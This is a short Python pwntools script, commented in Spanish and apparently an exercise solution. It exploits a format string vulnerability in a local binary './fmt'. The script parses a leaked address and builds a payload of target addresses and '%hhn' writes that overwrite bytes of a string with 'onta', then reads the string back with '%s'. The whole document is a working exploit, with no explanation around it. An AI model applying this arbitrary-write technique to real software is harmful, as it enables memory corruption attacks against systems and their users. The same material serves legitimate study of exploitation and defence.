#!/usr/bin/python3

from pwn import *
import sys

PATH = './fmt'
CADENA_NUEVA = 'onta'
PARAMETRO_INICIAL = 7   # Offset del parametro inicial

p = process (PATH)


recibido = p.recvline()
p.recv()
cadena_addr = int(recibido.split()[-1],16)
print ("[+] Direccion obtenida para la cadena: " + str(hex(cadena_addr)))

# Construimos el payload
payload  = p32(cadena_addr)  		# Direccion para leer
payload += p32(cadena_addr+2)		# Direccion del primer byte para escribir
payload += p32(cadena_addr+3)		# Direccion del segundo byte para escribir
payload += p32(cadena_addr+4)		# Direccion del tercer byte para escribir
payload += p32(cadena_addr+5)		# Direccion del cuarto byte para escribir
payload += b"|"

valor_inicial = len(payload)
par = PARAMETRO_INICIAL
offset_par = 1
for caracter in CADENA_NUEVA: 
	valor = ord(caracter)
	offset = (valor-valor_inicial)%256
	print ("[+] Caracter: %c, valor: %d, Offset: %d" % (caracter, valor, offset))
	cadena = "%" + str(offset) + "c%" + str(par + offset_par) + "$hhn"
	print ("    --> " + cadena)
	payload += cadena.encode()
	offset_par += 1
	valor_inicial = valor

cadena = "|%" + str(par) + "$s"
payload += cadena.encode()
print ("[i] payload: " + str(payload))

# Ahora enviamos el payload al otro extremo
p.sendline(payload)
#print (b"Recibido: " + p.recv())
resultado = p.recv().split(b':')[-1]
print ("[+] Resultado obtenido: " + resultado.decode('utf-8'))









